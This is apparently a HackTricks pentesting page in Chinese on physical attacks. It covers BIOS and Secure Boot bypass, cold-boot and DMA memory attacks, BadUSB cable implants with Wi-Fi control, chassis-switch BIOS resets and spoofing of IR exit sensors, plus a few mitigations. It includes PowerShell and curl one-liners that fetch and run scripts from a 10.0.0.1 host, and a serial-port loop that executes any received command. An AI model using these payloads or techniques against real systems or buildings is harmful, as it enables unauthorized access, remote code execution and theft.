# 物理攻击

{{#include ../banners/hacktricks-training.md}}

## BIOS 密码恢复与系统安全

**重置 BIOS** 可以通过几种方式实现。大多数主板包含一个 **电池**，将其移除约 **30 分钟** 可重置 BIOS 设置，包括密码。或者，可以通过调整主板上的 **跳线** 来重置这些设置，方法是连接特定引脚。

在无法或不便进行硬件操作的情况下，**软件工具** 提供了解决方案。从 **Live CD/USB** 启动系统，使用像 **Kali Linux** 这样的发行版，可以访问诸如 **_killCmos_** 和 **_CmosPWD_** 的工具，这些工具可以帮助恢复 BIOS 密码。

如果不知道 BIOS 密码，错误输入 **三次** 通常会产生一个错误代码。可以将该代码在像 [https://bios-pw.org](https://bios-pw.org) 这样的网站上使用，以可能检索到可用密码。

### UEFI 安全

对于使用 **UEFI** 而非传统 BIOS 的现代系统，可以使用工具 **chipsec** 来分析并修改 UEFI 设置，包括禁用 **Secure Boot**。这可以通过以下命令完成：
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM 分析与冷启动攻击

RAM 在断电后会短暂保留数据，通常为 **1 到 2 分钟**。通过施加冷却物质（例如液氮），这种持久性可延长至 **10 分钟**。在此延长期间，可以使用像 **dd.exe** 和 **volatility** 这样的工具创建 **memory dump** 以进行分析。

---

## Direct Memory Access (DMA) 攻击

**INCEPTION** 是一个用于通过 DMA 进行 **physical memory manipulation** 的工具，兼容 **FireWire** 和 **Thunderbolt** 等接口。它可以通过修补内存以接受任意密码来绕过登录流程。然而，对 **Windows 10** 系统无效。

---

## Live CD/USB 用于系统访问

将系统二进制文件（例如 **_sethc.exe_** 或 **_Utilman.exe_**）替换为 **_cmd.exe_** 的副本，可以获得具有系统权限的命令提示符。像 **chntpw** 这样的工具可用于编辑 Windows 安装的 **SAM** 文件，从而更改密码。

**Kon-Boot** 是一个通过临时修改 Windows kernel 或 UEFI 来在不知道密码的情况下登录 Windows 系统的工具。更多信息见 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)。

---

## 处理 Windows 安全功能

### 引导与恢复快捷键

- **Supr**：进入 BIOS 设置。
- **F8**：进入恢复模式。
- 在 Windows 横幅后按 **Shift** 可以绕过自动登录。

### BAD USB 设备

像 **Rubber Ducky** 和 **Teensyduino** 这样的设备可用来创建 **bad USB** 设备，连接到目标计算机时能够执行预定义的 payload。

### Volume Shadow Copy

具有管理员权限可以通过 PowerShell 创建敏感文件（包括 **SAM** 文件）的副本。

## BadUSB / HID 植入技术

### Wi-Fi 管理的线缆植入器

- 基于 ESP32-S3 的植入器（例如 **Evil Crow Cable Wind**）隐藏在 USB-A→USB-C 或 USB-C↔USB-C 数据线内，枚举为纯 USB 键盘，并通过 Wi-Fi 暴露其 C2 堆栈。操作者只需从受害主机为线缆供电，创建名为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址）即可到达嵌入的 HTTP 界面。
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 选项卡。存储的 payload 会按 OS 打标签，键盘布局可动态切换，VID/PID 字符串可修改以模拟已知外设。
- 因为 C2 位于线缆内部，手机可以在不接触主机 OS 的情况下准备 payload、触发执行并管理 Wi-Fi 凭据——非常适合短停留时间的物理入侵。

### OS 感知的 AutoExec payloads

- AutoExec 规则将一个或多个 payload 绑定为在 USB 枚举后立即触发。植入器执行轻量级的 OS 指纹识别并选择匹配的脚本。
- 示例工作流：
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 由于执行是无人值守的，仅替换充电线缆即可在已登录用户上下文下实现“plug-and-pwn”初始访问。

### HID 引导的通过 Wi-Fi TCP 的远程 shell

1. **Keystroke bootstrap：** 存储的 payload 会打开控制台并粘贴一个循环，从而执行发送到新的 USB serial device 的任何内容。一个最小的 Windows 变体如下：
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant 保持 USB CDC 通道打开，同时其 ESP32-S3 启动一个 TCP client（Python script、Android APK 或 desktop executable）回连到 operator。任何在 TCP session 中输入的字节都会被转发到上面的串行循环，从而即使在 air-gapped hosts 上也能实现远程命令执行。输出受限，因此 operators 通常执行盲命令（account creation、staging additional tooling 等）。

### HTTP OTA 更新面

- 同一 web stack 通常会暴露 unauthenticated firmware updates。Evil Crow Cable Wind 在 `/update` 上监听并 flash 上传的任何 binary：
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 现场操作人员可以在行动中途热插拔功能（例如，flash USB Army Knife firmware），而无需打开电缆，使 implant 在仍连接到目标主机时切换到新的能力。

## Bypassing BitLocker Encryption

如果在内存转储文件（**MEMORY.DMP**）中发现了 **recovery password**，BitLocker 加密可能被绕过。可以使用 **Elcomsoft Forensic Disk Decryptor** 或 **Passware Kit Forensic** 等工具来实现此目的。

---

## Social Engineering for Recovery Key Addition

可以通过社交工程手段添加一个新的 BitLocker recovery key：诱导用户执行一个命令，添加一个由零组成的新 recovery key，从而简化解密过程。

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

许多现代笔记本和小型台式机都包含一个由 Embedded Controller (EC) 和 BIOS/UEFI 固件监控的 **chassis-intrusion switch**。尽管该开关的主要目的是在设备被打开时发出警报，但厂商有时会实现一个在以特定模式切换开关时触发的 **undocumented recovery shortcut**。

### How the Attack Works

1. 该开关连接到 EC 的 **GPIO interrupt**。
2. 运行在 EC 上的固件会记录 **timing and number of presses**。
3. 当识别出硬编码的模式时，EC 会调用 *mainboard-reset* 例程，**erases the contents of the system NVRAM/CMOS**。
4. 下次启动时，BIOS 会加载默认值——**supervisor password、Secure Boot keys，以及所有自定义配置都会被清除**。

> 一旦 Secure Boot 被禁用且固件密码被清除，攻击者就可以直接启动任何外部 OS 映像并获得对内部驱动器的无限制访问。

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
在第十次循环后，EC 会设置一个标志，指示 BIOS 在下一次重启时清除 NVRAM。整个过程大约需要 ~40 s，并且只需要 **一把螺丝刀**。

### Generic Exploitation Procedure

1. 将目标设备上电或执行挂起-恢复（suspend-resume），以使 EC 运行。
2. 拆下底盖以露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启 – 固件保护应被禁用。
5. 从 live USB（例如 Kali Linux）引导并执行常见的 post-exploitation（credential dumping、data exfiltration、植入恶意 EFI 二进制等）。

### Detection & Mitigation

* 在 OS 管理控制台中记录机箱入侵事件，并与意外的 BIOS 重置进行关联分析。
* 在螺丝/盖板上使用 **tamper-evident seals** 以检测打开。
* 将设备放置在 **physically controlled areas**；假定物理访问等于完全妥协。
* 在可能的情况下，禁用厂商的 “maintenance switch reset” 功能或要求对 NVRAM 重置提供额外的加密授权。

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- 商用 “wave-to-exit” 传感器将 near-IR LED 发射器与 TV-remote 风格的接收模块配对；接收器只有在检测到正确载波（≈30 kHz）的多个脉冲（约 ~4–10 次）后才报告逻辑高电平。
- 塑料遮罩阻止发射器与接收器直接相对，因此控制器假定任何被验证的载波来自附近的反射并驱动继电器以打开门闩。
- 一旦控制器认为有目标存在，通常会改变外发的调制包络，但接收器仍然接受任何与滤波载波匹配的脉冲。

### Attack Workflow
1. **捕获发射特征** – 在控制器引脚上夹接 logic analyser 来记录驱动内部 IR LED 的检测前后波形。
2. **只重放 “post-detection” 波形** – 移除/忽略原装发射器，并从一开始就用外部 IR LED 驱动已触发的模式。因为接收器只关心脉冲数量/频率，它将伪造的载波视为真实反射并置位继电器线路。
3. **门控传输** – 以调谐的突发方式发送载波（例如，数十毫秒开启、类似时长关闭），以在不使接收器的 AGC 或干扰处理逻辑饱和的情况下提供最少脉冲计数。持续发射会迅速使传感器失敏并阻止继电器触发。

### Long-Range Reflective Injection
- 将台式 LED 替换为大功率 IR 二极管、MOSFET 驱动和聚焦光学组件，可实现约 ~6 m 距离的可靠触发。
- 攻击者无需与接收器光口保持直视线；将光束瞄准可通过玻璃看到的室内墙面、货架或门框，反射能量会进入约 30° 的视场并模仿近距离的挥手动作。
- 由于接收器只期望弱反射，一个更强的外部光束可以在多个表面反弹后仍然高于检测阈值。

### Weaponised Attack Torch
- 将驱动器嵌入商用手电筒内可以将工具隐藏在显眼处。将可见 LED 更换为与接收器频段匹配的大功率 IR LED，添加 ATtiny412（或类似）以生成 ≈30 kHz 的脉冲，并使用 MOSFET 拉低 LED 电流。
- 伸缩变焦镜头可以收束光束以提高射程/精度，而由 MCU 控制的振动电机在不发出可见光的情况下提供触觉确认，表明调制已激活。
- 循环切换多个存储的调制模式（载波频率和包络略有差异）可以提高不同品牌传感器系列的兼容性，让操作者扫过反射表面直到听到继电器的点击并门打开为止。

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
